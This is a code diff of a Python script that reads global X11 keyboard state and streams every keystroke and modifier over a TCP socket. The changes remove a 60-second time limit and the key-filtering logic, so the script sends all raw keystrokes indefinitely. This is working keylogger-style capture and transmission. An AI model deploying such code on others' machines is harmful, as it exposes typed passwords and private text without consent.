@@ -128,44 +128,7 @@ key_mapping = {
 }
 
 
-def messageKeyboard(messageData):
-    start=messageData.find('{')+1
-    
-    end=messageData.find('}')-1
-    
-    keyS=messageData.find(',')+1
-    keyE=start-1
-    key=messageData[keyS:keyE]
-    
-#     print('key'+messageData[keyS:keyE])
-#     print('other'+messageData[start:end])
-    
-    other=messageData[start:end]
-    ind=other.find('la')
-    other=other.split(',')
-    
-    tempI=other[2].find(':')
-    
-    alt=other[2][tempI:tempI+3]
-    
-    if alt.find('T')>=0:
-        alt=True
-    else:
-        alt=False
 
-    if key.find('tab')>=0:
-        tab=True
-    else:
-        tab=False
-        
-    
-    if key.find('space')>=0:
-        space=True
-    else:
-        space=False
-    
-#     print(alt,tab,space)
-    return [alt,tab,space]
 
 def fetch_keys_raw():
     x11.XQueryKeymap(display, keyboard)
@@ -223,10 +186,10 @@ def fetch_keys():
 
 
 
-def log(done,sleep_interval=.01):
+def log(sleep_interval=.001):
     socketCon=False
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    while not done():
+    while True:
         while socketCon==False:
             print('attempting to connect')
             
@@ -234,25 +197,19 @@ def log(done,sleep_interval=.01):
             
             if e==0:
                 socketCon=True
+                print('Connected')
         
-#         sleep(sleep_interval)
         changed, modifiers, keys = fetch_keys()
         if changed:
             mess2send='key,%r %r'%(keys,modifiers)
             print(mess2send)
-            
-            data=messageKeyboard(mess2send)
-            mess='key : '+str(data)
-            s.send(mess)
+            s.send(mess2send)
     s.close()
 
 
 
 if __name__=='__main__':
-    now = time()
-    done = lambda: time() > now + 60
-    while True:
-        log(done)
+    log()
 
 
 
